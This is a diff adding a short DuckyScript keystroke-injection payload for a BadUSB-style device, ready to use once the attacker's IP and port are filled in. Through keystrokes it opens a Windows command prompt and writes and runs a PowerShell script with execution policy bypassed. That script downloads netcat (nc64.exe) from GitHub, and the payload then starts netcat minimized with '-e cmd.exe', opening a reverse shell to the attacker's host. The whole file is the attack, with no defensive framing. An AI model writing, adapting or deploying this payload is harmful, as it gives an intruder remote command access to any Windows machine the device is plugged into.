@@ -1,0 +1,16 @@
+REM Change The IP and the Port, and for the ip address and the port please remove this symbol (<>) 
+
+DELAY 1000
+GUI r
+DELAY 1000
+
+STRING cmd
+ENTER
+DELAY 1000
+
+STRING cd / & mkdir win & cd win & echo (wget 'https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc64.exe' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1
+ENTER
+DELAY 3000
+
+STRING START /MIN a.exe <YOUR IP> <YOUR PORT> -e cmd.exe -d & exit
+ENTER
